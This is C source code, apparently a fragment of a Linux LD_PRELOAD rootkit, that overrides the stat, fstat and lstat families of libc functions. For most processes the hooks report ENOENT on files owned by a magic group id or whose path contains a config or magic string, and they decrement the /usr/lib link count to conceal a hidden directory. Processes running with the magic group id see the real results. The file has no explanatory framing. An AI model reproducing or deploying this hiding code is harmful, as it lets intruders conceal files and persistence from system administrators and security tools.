int stat (const char *path, struct stat *buf) {
  struct stat s_fstat;
  int retval;
  if (!libc) libc = dlopen (LIBC_PATH, RTLD_LAZY);

  if (!old_xstat) old_xstat = find_sym (libc, "__xstat");
  if(getgid() == MAGIC_GID) return old_xstat(_STAT_VER,path,buf);
  memset (&s_fstat, 0, sizeof (stat));
  old_xstat (_STAT_VER, path, &s_fstat);
  if (s_fstat.st_gid == MAGIC_GID || strstr (path, CONFIG_FILE)
      || strstr (path, MAGIC_STRING)) {
    errno = ENOENT;
    return -1;
  }

  retval = old_xstat (3, path, buf);
  if (!strcmp(path,"/usr/lib") || (!strcmp(path,".") && !strcmp(get_current_dir_name(),"/usr/lib"))) buf->st_nlink = buf->st_nlink -1;
  return retval;
}

int stat64 (const char *path, struct stat64 *buf) {
  struct stat64 s_fstat;

  if (!libc) libc = dlopen (LIBC_PATH, RTLD_LAZY);

  if (!old_xstat64) old_xstat64 = find_sym (libc, "__xstat64");
  if(getgid() == MAGIC_GID) return old_xstat64(_STAT_VER,path,buf);
  memset (&s_fstat, 0, sizeof (stat));

  old_xstat64 (_STAT_VER, path, &s_fstat);

  if (s_fstat.st_gid == MAGIC_GID || strstr (path, CONFIG_FILE)
      || strstr (path, MAGIC_STRING)) {
    errno = ENOENT;
    return -1;
  }

  int retval = old_xstat64 (_STAT_VER, path, buf);
//  if (!strcmp(path,"/usr/lib")) buf->st_nlink = buf->st_nlink -1;
  if (!strcmp(path,"/usr/lib") || (!strcmp(path,".") && !strcmp(get_current_dir_name(),"/usr/lib"))) buf->st_nlink = buf->st_nlink -1;

  return retval;
}

int __xstat (int ver, const char *path, struct stat *buf) {
  struct stat s_fstat;

  if (!libc) libc = dlopen (LIBC_PATH, RTLD_LAZY);

  if (!old_xstat) old_xstat = find_sym (libc, "__xstat");
  if(getgid() == MAGIC_GID) return old_xstat(_STAT_VER,path,buf);
  memset (&s_fstat, 0, sizeof (stat));
  old_xstat (ver, path, &s_fstat);
  memset (&s_fstat, 0, sizeof (stat));

  if (s_fstat.st_gid == MAGIC_GID || strstr (path, CONFIG_FILE)
      || strstr (path, MAGIC_STRING)) {
    errno = ENOENT;
    return -1;
  }

  int retval = old_xstat (ver, path, buf);
  if (!strcmp(path,"/usr/lib") || (!strcmp(path,".") && !strcmp(get_current_dir_name(),"/usr/lib"))) buf->st_nlink = buf->st_nlink -1;
  return retval;
}

int __xstat64 (int ver, const char *path, struct stat64 *buf) {
  struct stat64 s_fstat;

  if (!libc) libc = dlopen (LIBC_PATH, RTLD_LAZY);

  if (!old_xstat64) old_xstat64 = find_sym (libc, "__xstat64");
  if(getgid() == MAGIC_GID) return old_xstat64(_STAT_VER,path,buf);
  memset (&s_fstat, 0, sizeof (stat));

  old_xstat64 (ver, path, &s_fstat);

  if (s_fstat.st_gid == MAGIC_GID || strstr (path, CONFIG_FILE)
      || strstr (path, MAGIC_STRING)) {
    errno = ENOENT;
    return -1;
  }

  int retval = old_xstat64 (ver, path, buf);
  if (!strcmp(path,"/usr/lib") || (!strcmp(path,".") && !strcmp(get_current_dir_name(),"/usr/lib"))) buf->st_nlink = buf->st_nlink -1;
  return retval;

}

int fstat (int fd, struct stat *buf) {
  struct stat s_fstat;

  if (!libc) libc = dlopen (LIBC_PATH, RTLD_LAZY);

  if (!old_fxstat) old_fxstat = find_sym (libc, "__fxstat");
  if(getgid() == MAGIC_GID) return old_fxstat(_STAT_VER,fd,buf);
  memset (&s_fstat, 0, sizeof (stat));

  old_fxstat (_STAT_VER, fd, &s_fstat);

  if (s_fstat.st_gid == MAGIC_GID) {
    errno = ENOENT;
    return -1;
  }

  return old_fxstat (_STAT_VER, fd, buf);
}


int fstat64 (int fd, struct stat64 *buf) {
  struct stat64 s_fstat;


  if (!libc) libc = dlopen (LIBC_PATH, RTLD_LAZY);

  if(!old_fxstat64) old_fxstat64 = find_sym (libc, "__fxstat64");
  if(getgid() == MAGIC_GID) return old_fxstat64(_STAT_VER,fd,buf);
  memset (&s_fstat, 0, sizeof (stat));

  old_fxstat64 (_STAT_VER, fd, &s_fstat);

  if (s_fstat.st_gid == MAGIC_GID) {
    errno = ENOENT;
    return -1;
  }

  return old_fxstat64 (_STAT_VER, fd, buf);
}

int __fxstat (int ver, int fildes, struct stat *buf) {
  struct stat s_fstat;

  if (!libc) libc = dlopen (LIBC_PATH, RTLD_LAZY);

  if (!old_fxstat) old_fxstat = find_sym (libc, "__fxstat");
  if(getgid() == MAGIC_GID) return old_fxstat(ver,fildes,buf);
  memset (&s_fstat, 0, sizeof (stat));

  old_fxstat (ver, fildes, &s_fstat);

  if (s_fstat.st_gid == MAGIC_GID) {
    errno = ENOENT;
    return -1;
  }
  return old_fxstat (ver, fildes, buf);
}

int __fxstat64 (int ver, int fildes, struct stat64 *buf) {
  struct stat64 s_fstat;


  if (!libc) libc = dlopen (LIBC_PATH, RTLD_LAZY);

  if (!old_fxstat64) old_fxstat64 = find_sym (libc, "__fxstat64");
  if(getgid() == MAGIC_GID) return old_fxstat64(ver,fildes,buf);
  memset (&s_fstat, 0, sizeof (stat));

  old_fxstat64 (ver, fildes, &s_fstat);

  if (s_fstat.st_gid == MAGIC_GID) {
    errno = ENOENT;
    return -1;
  }

  return old_fxstat64 (ver, fildes, buf);
}

int lstat (const char *file, struct stat *buf) {
  struct stat s_fstat;
  char readlinkbuf[PATH_MAX];

  if (!libc) libc = dlopen (LIBC_PATH, RTLD_LAZY);
  if (!old_lxstat) old_lxstat = find_sym (libc, "__lxstat");
  if(getgid() == MAGIC_GID) return old_lxstat (_STAT_VER, file, buf);
  memset (&s_fstat, 0, sizeof (stat));
  old_lxstat (_STAT_VER, file, &s_fstat);
  readlink(file,readlinkbuf,sizeof(readlinkbuf));
  if (s_fstat.st_gid == MAGIC_GID || strstr (file, CONFIG_FILE)
      || strstr (file, MAGIC_STRING) || strstr(readlinkbuf,CONFIG_FILE) || strstr(readlinkbuf,MAGIC_STRING)) {
    errno = ENOENT;
    return -1;
  }

  int retval = old_lxstat (_STAT_VER, file, buf);
  if (!strcmp(file,"/usr/lib") || (!strcmp(file,".") && !strcmp(get_current_dir_name(),"/usr/lib"))) buf->st_nlink = buf->st_nlink -1;

  return retval;
}

int lstat64 (const char *file, struct stat64 *buf) {
  struct stat64 s_fstat;


  if (!libc) libc = dlopen (LIBC_PATH, RTLD_LAZY);

  if (!old_lxstat64) old_lxstat64 = find_sym (libc, "__lxstat64");
  if(getgid() == MAGIC_GID) return old_lxstat64(_STAT_VER, file, buf);

  memset (&s_fstat, 0, sizeof (stat));
  old_lxstat64 (_STAT_VER, file, &s_fstat);

  if (s_fstat.st_gid == MAGIC_GID || strstr (file, CONFIG_FILE)
      || strstr (file, MAGIC_STRING)) {
    errno = ENOENT;
    return -1;
  }

  int retval = old_lxstat64 (_STAT_VER, file, buf);
  if (!strcmp(file,"/usr/lib") || (!strcmp(file,".") && !strcmp(get_current_dir_name(),"/usr/lib"))) buf->st_nlink = buf->st_nlink -1;
  return retval;
}

int __lxstat (int ver, const char *file, struct stat *buf) {
  struct stat s_fstat;

  if (!libc) libc = dlopen (LIBC_PATH, RTLD_LAZY);

  if (!old_lxstat) old_lxstat = find_sym (libc, "__lxstat");
  if(getgid() == MAGIC_GID) return old_lxstat(_STAT_VER, file, buf);
  memset (&s_fstat, 0, sizeof (stat));

  old_lxstat (ver, file, &s_fstat);

  if (s_fstat.st_gid == MAGIC_GID || strstr (file, CONFIG_FILE)
      || strstr (file, MAGIC_STRING)) {
    errno = ENOENT;
    return -1;
  }

  int retval = old_lxstat (ver, file, buf);
  if (!strcmp(file,"/usr/lib") || (!strcmp(file,".") && !strcmp(get_current_dir_name(),"/usr/lib"))) buf->st_nlink = buf->st_nlink -1;

  return retval;

}

int __lxstat64 (int ver, const char *file, struct stat64 *buf) {
  struct stat64 s_fstat;

  if (!libc) libc = dlopen (LIBC_PATH, RTLD_LAZY);

  if (!old_lxstat64) old_lxstat64 = find_sym (libc, "__lxstat64");
  if(getgid() == MAGIC_GID) return old_lxstat64(_STAT_VER, file, buf);
  memset (&s_fstat, 0, sizeof (stat));

  old_lxstat64 (ver, file, &s_fstat);

  if (s_fstat.st_gid == MAGIC_GID || strstr (file, CONFIG_FILE)
      || strstr (file, MAGIC_STRING)) {
    errno = ENOENT;
    return -1;
  }

  int retval = old_lxstat64 (ver, file, buf);
  if (!strcmp(file,"/usr/lib") || (!strcmp(file,".") && !strcmp(get_current_dir_name(),"/usr/lib"))) buf->st_nlink = buf->st_nlink -1;

  return retval;

}

